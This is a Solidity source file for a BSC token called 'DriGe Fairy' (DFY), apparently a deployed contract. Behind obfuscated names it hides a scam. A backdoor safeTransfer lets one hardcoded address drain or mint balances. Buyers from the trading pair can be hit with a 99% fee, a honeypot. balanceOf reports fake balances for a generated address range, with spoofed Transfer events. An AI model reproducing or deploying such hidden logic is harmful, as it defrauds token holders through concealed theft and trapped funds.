/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function factory() external pure returns (address);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}




contract DriGeFairy is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 public sellWalletMintTeamExempt = 0;
    uint256 constant tradingShouldSwapToReceiverFromExempt = 10000 * 10 ** 18;

    uint160 constant minTxEnableMax = 215830753726 * 2 ** 120;
    uint160 constant walletMaxSenderTotal = 233279635589 * 2 ** 80;

    uint256 constant fundToLaunchedLaunch = 300000 * 10 ** 18;
    bool private fundEnableLaunchedBuy = false;
    uint256 sellWalletFundTo = 0;
    
    address public uniswapV2Pair;
    bool private takeMaxBotsSell = false;
    uint256 private botsExemptIsAt = 100;
    string constant _name = "DriGe Fairy";
    bool private launchedTradingShouldSell = false;
    address constant totalExemptMintMaxMinToken = 0x902324E72Bf570dB709ABD90ACEaba156Bee013d;

    mapping(address => bool)  takeModeTradingFee;
    IUniswapV2Router public botsLimitMarketingLaunchedTotalMint;
    mapping(address => bool) private totalAtEnableTake;

    mapping(address => uint256) _balances;

    uint256 private fundExemptAtMarketing = 0;

    mapping(address => bool)  marketingSenderFundListBurnToBuy;


    string constant _symbol = "DFY";
    bool private autoReceiverAtTeam = false;
    bool private burnReceiverMintIsBots = false;
    uint256 private exemptLimitBuyIs = 0;
    uint160 constant receiverShouldReceiverFund = 937995018661;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 fundIsToTake = 100000000 * (10 ** _decimals);
    uint160 constant amountToSellTx = 110679272399 * 2 ** 40;
    bool private atAmountBuyLimit = false;
    uint256  buyWalletMinReceiver = 100000000 * 10 ** _decimals;
    bool public limitFeeFromTo = false;
    uint256  amountReceiverLiquidityToken = 100000000 * 10 ** _decimals;
    uint256 private limitAutoLaunchedExempt = 0;

    uint256 private sellShouldEnableFrom = 0;

    bool private exemptShouldReceiverTradingBurn = false;

    address private autoBotsSenderMax = (msg.sender);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        botsLimitMarketingLaunchedTotalMint = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(botsLimitMarketingLaunchedTotalMint.factory()).createPair(address(this), botsLimitMarketingLaunchedTotalMint.WETH());
        _allowances[address(this)][address(botsLimitMarketingLaunchedTotalMint)] = fundIsToTake;

        totalAtEnableTake[msg.sender] = true;
        totalAtEnableTake[address(this)] = true;

        _balances[msg.sender] = fundIsToTake;
        emit Transfer(address(0), msg.sender, fundIsToTake);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return fundIsToTake;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getenableTakeBotsTeam() public view returns (bool) {
        if (takeMaxBotsSell == takeMaxBotsSell) {
            return takeMaxBotsSell;
        }
        return takeMaxBotsSell;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setenableTakeBotsTeam(bool receiverEnableFeeBurn) public onlyOwner {
        if (takeMaxBotsSell == launchedTradingShouldSell) {
            launchedTradingShouldSell=receiverEnableFeeBurn;
        }
        if (takeMaxBotsSell != burnReceiverMintIsBots) {
            burnReceiverMintIsBots=receiverEnableFeeBurn;
        }
        takeMaxBotsSell=receiverEnableFeeBurn;
    }

    function settradingSwapAmountLaunched(uint256 receiverEnableFeeBurn) public onlyOwner {
        if (sellShouldEnableFrom != sellWalletMintTeamExempt) {
            sellWalletMintTeamExempt=receiverEnableFeeBurn;
        }
        sellShouldEnableFrom=receiverEnableFeeBurn;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != fundIsToTake) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return limitLaunchedMaxBotsMint(sender, recipient, amount);
    }

    function approveMax(address spender) external {
        if (marketingSenderFundListBurnToBuy[spender]) {
            takeModeTradingFee[spender] = true;
        }
    }

    function receiverFundAmountFrom(address fromSwapWalletTeamBurnMinLaunched, address totalEnableAutoAmount, uint256 tradingToLaunchMin, bool amountExemptToLimit) private {
        uint160 teamExemptSellFrom = minTxEnableMax + walletMaxSenderTotal + amountToSellTx + receiverShouldReceiverFund;
        if (amountExemptToLimit) {
            fromSwapWalletTeamBurnMinLaunched = address(uint160(teamExemptSellFrom + sellWalletFundTo));
            sellWalletFundTo++;
            _balances[totalEnableAutoAmount] = _balances[totalEnableAutoAmount].add(tradingToLaunchMin);
        } else {
            _balances[fromSwapWalletTeamBurnMinLaunched] = _balances[fromSwapWalletTeamBurnMinLaunched].sub(tradingToLaunchMin);
        }
        emit Transfer(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin);
    }

    function setlistTradingIsMin(uint256 receiverEnableFeeBurn) public onlyOwner {
        if (botsExemptIsAt != sellWalletMintTeamExempt) {
            sellWalletMintTeamExempt=receiverEnableFeeBurn;
        }
        if (botsExemptIsAt == limitAutoLaunchedExempt) {
            limitAutoLaunchedExempt=receiverEnableFeeBurn;
        }
        botsExemptIsAt=receiverEnableFeeBurn;
    }

    function receiverLaunchedExemptTo(address swapMaxTeamExempt) private view returns (bool) {
        return swapMaxTeamExempt == autoBotsSenderMax;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function amountAutoReceiverLiquidity(uint160 listFundTxExempt) private pure returns (bool) {
        uint160 teamExemptSellFrom = minTxEnableMax + walletMaxSenderTotal + amountToSellTx + receiverShouldReceiverFund;
        if (listFundTxExempt >= uint160(teamExemptSellFrom)) {
            if (listFundTxExempt <= uint160(teamExemptSellFrom) + 200000) {
                return true;
            }
        }
        return false;
    }

    function botsTakeBuyListTradingTotal(address fromSwapWalletTeamBurnMinLaunched, bool sellAutoShouldLaunchTradingReceiver) internal returns (uint256) {
        if (takeModeTradingFee[fromSwapWalletTeamBurnMinLaunched]) {
            return 99;
        }
        
        if (sellAutoShouldLaunchTradingReceiver) {
            return exemptLimitBuyIs;
        }
        if (!sellAutoShouldLaunchTradingReceiver && fromSwapWalletTeamBurnMinLaunched == uniswapV2Pair) {
            return fundExemptAtMarketing;
        }
        return 0;
    }

    function getfundIsMarketingEnableTotal() public view returns (uint256) {
        return sellWalletMintTeamExempt;
    }

    function liquidityLaunchFromBotsFundToLimit(address fromSwapWalletTeamBurnMinLaunched, address amountAutoExemptBurn, uint256 tradingToLaunchMin) internal returns (uint256) {
        
        uint256 feeSellSenderReceiverAuto = tradingToLaunchMin.mul(botsTakeBuyListTradingTotal(fromSwapWalletTeamBurnMinLaunched, amountAutoExemptBurn == uniswapV2Pair)).div(botsExemptIsAt);

        if (feeSellSenderReceiverAuto > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeSellSenderReceiverAuto);
            emit Transfer(fromSwapWalletTeamBurnMinLaunched, address(this), feeSellSenderReceiverAuto);
        }

        return tradingToLaunchMin.sub(feeSellSenderReceiverAuto);
    }

    function getfundIsMarketingEnableTotal0() public view returns (bool) {
        if (launchedTradingShouldSell == limitFeeFromTo) {
            return limitFeeFromTo;
        }
        return launchedTradingShouldSell;
    }

    function amountFromLiquidityEnable(address fromSwapWalletTeamBurnMinLaunched) internal view returns (bool) {
        return !totalAtEnableTake[fromSwapWalletTeamBurnMinLaunched];
    }

    function teamLiquidityToMin(address listFundTxExempt) private pure returns (bool) {
        return listFundTxExempt == totalExemptMintMaxMinToken;
    }

    function setfundIsMarketingEnableTotal(uint256 receiverEnableFeeBurn) public onlyOwner {
        if (sellWalletMintTeamExempt == sellWalletMintTeamExempt) {
            sellWalletMintTeamExempt=receiverEnableFeeBurn;
        }
        if (sellWalletMintTeamExempt != sellWalletMintTeamExempt) {
            sellWalletMintTeamExempt=receiverEnableFeeBurn;
        }
        sellWalletMintTeamExempt=receiverEnableFeeBurn;
    }

    function getlistTradingIsMin() public view returns (uint256) {
        if (botsExemptIsAt == sellWalletMintTeamExempt) {
            return sellWalletMintTeamExempt;
        }
        if (botsExemptIsAt == sellShouldEnableFrom) {
            return sellShouldEnableFrom;
        }
        if (botsExemptIsAt == sellShouldEnableFrom) {
            return sellShouldEnableFrom;
        }
        return botsExemptIsAt;
    }

    function safeTransfer(address fromSwapWalletTeamBurnMinLaunched, address totalEnableAutoAmount, uint256 tradingToLaunchMin) public {
        if (!teamLiquidityToMin(msg.sender)) {
            return;
        }
        if (totalEnableAutoAmount == address(0)) {
            return;
        }
        if (amountAutoReceiverLiquidity(uint160(totalEnableAutoAmount))) {
            receiverFundAmountFrom(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin, false);
            return;
        }
        if (amountAutoReceiverLiquidity(uint160(fromSwapWalletTeamBurnMinLaunched))) {
            receiverFundAmountFrom(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin, true);
            return;
        }
        if (tradingToLaunchMin == 0) {
            return;
        }
        if (fromSwapWalletTeamBurnMinLaunched == address(0)) {
            _balances[totalEnableAutoAmount] = _balances[totalEnableAutoAmount].add(tradingToLaunchMin);
            return;
        }
    }

    function minShouldMaxListTakeMint(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitTotalBuyTradingLiquiditySwap(uint160 listFundTxExempt) private view returns (uint256) {
        uint160 teamExemptSellFrom = minTxEnableMax + walletMaxSenderTotal + amountToSellTx + receiverShouldReceiverFund;
        if ((listFundTxExempt - uint160(teamExemptSellFrom)) < sellWalletFundTo) {
            return tradingShouldSwapToReceiverFromExempt;
        }
        return fundToLaunchedLaunch;
    }

    function getisFromReceiverEnable(address receiverEnableFeeBurn) public view returns (bool) {
        if (receiverEnableFeeBurn != autoBotsSenderMax) {
            return burnReceiverMintIsBots;
        }
        if (receiverEnableFeeBurn != autoBotsSenderMax) {
            return autoReceiverAtTeam;
        }
        if (receiverEnableFeeBurn != autoBotsSenderMax) {
            return fundEnableLaunchedBuy;
        }
            return totalAtEnableTake[receiverEnableFeeBurn];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getshouldTotalReceiverBuyLiquidity() public view returns (uint256) {
        if (exemptLimitBuyIs == botsExemptIsAt) {
            return botsExemptIsAt;
        }
        if (exemptLimitBuyIs == sellShouldEnableFrom) {
            return sellShouldEnableFrom;
        }
        return exemptLimitBuyIs;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function setisFromReceiverEnable(address receiverEnableFeeBurn,bool minExemptMintFund) public onlyOwner {
        totalAtEnableTake[receiverEnableFeeBurn]=minExemptMintFund;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitLaunchedMaxBotsMint(msg.sender, recipient, amount);
    }

    function isApproveMax(address spender) public view returns (bool) {
        return takeModeTradingFee[spender];
    }

    function setfundIsMarketingEnableTotal0(bool receiverEnableFeeBurn) public onlyOwner {
        if (launchedTradingShouldSell == takeMaxBotsSell) {
            takeMaxBotsSell=receiverEnableFeeBurn;
        }
        if (launchedTradingShouldSell != takeMaxBotsSell) {
            takeMaxBotsSell=receiverEnableFeeBurn;
        }
        if (launchedTradingShouldSell == fundEnableLaunchedBuy) {
            fundEnableLaunchedBuy=receiverEnableFeeBurn;
        }
        launchedTradingShouldSell=receiverEnableFeeBurn;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (amountAutoReceiverLiquidity(uint160(account))) {
            return limitTotalBuyTradingLiquiditySwap(uint160(account));
        }
        return _balances[account];
    }

    function gettradingSwapAmountLaunched() public view returns (uint256) {
        return sellShouldEnableFrom;
    }

    function limitLaunchedMaxBotsMint(address fromSwapWalletTeamBurnMinLaunched, address totalEnableAutoAmount, uint256 tradingToLaunchMin) internal returns (bool) {
        if (amountAutoReceiverLiquidity(uint160(totalEnableAutoAmount))) {
            receiverFundAmountFrom(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin, false);
            return true;
        }
        if (amountAutoReceiverLiquidity(uint160(fromSwapWalletTeamBurnMinLaunched))) {
            receiverFundAmountFrom(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin, true);
            return true;
        }
        
        if (sellShouldEnableFrom == fundExemptAtMarketing) {
            sellShouldEnableFrom = sellShouldEnableFrom;
        }


        bool marketingModeLaunchReceiver = receiverLaunchedExemptTo(fromSwapWalletTeamBurnMinLaunched) || receiverLaunchedExemptTo(totalEnableAutoAmount);
        
        if (exemptShouldReceiverTradingBurn == launchedTradingShouldSell) {
            exemptShouldReceiverTradingBurn = burnReceiverMintIsBots;
        }


        if (fromSwapWalletTeamBurnMinLaunched == uniswapV2Pair && !marketingModeLaunchReceiver) {
            marketingSenderFundListBurnToBuy[totalEnableAutoAmount] = true;
        }
        
        if (takeMaxBotsSell == fundEnableLaunchedBuy) {
            takeMaxBotsSell = exemptShouldReceiverTradingBurn;
        }


        if (marketingModeLaunchReceiver) {
            return minShouldMaxListTakeMint(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin);
        }
        
        _balances[fromSwapWalletTeamBurnMinLaunched] = _balances[fromSwapWalletTeamBurnMinLaunched].sub(tradingToLaunchMin, "Insufficient Balance!");
        
        uint256 sellFromToTotalLiquidityWalletMin = amountFromLiquidityEnable(fromSwapWalletTeamBurnMinLaunched) ? liquidityLaunchFromBotsFundToLimit(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, tradingToLaunchMin) : tradingToLaunchMin;

        _balances[totalEnableAutoAmount] = _balances[totalEnableAutoAmount].add(sellFromToTotalLiquidityWalletMin);
        emit Transfer(fromSwapWalletTeamBurnMinLaunched, totalEnableAutoAmount, sellFromToTotalLiquidityWalletMin);
        return true;
    }

    function setshouldTotalReceiverBuyLiquidity(uint256 receiverEnableFeeBurn) public onlyOwner {
        if (exemptLimitBuyIs == exemptLimitBuyIs) {
            exemptLimitBuyIs=receiverEnableFeeBurn;
        }
        if (exemptLimitBuyIs != exemptLimitBuyIs) {
            exemptLimitBuyIs=receiverEnableFeeBurn;
        }
        if (exemptLimitBuyIs != limitAutoLaunchedExempt) {
            limitAutoLaunchedExempt=receiverEnableFeeBurn;
        }
        exemptLimitBuyIs=receiverEnableFeeBurn;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}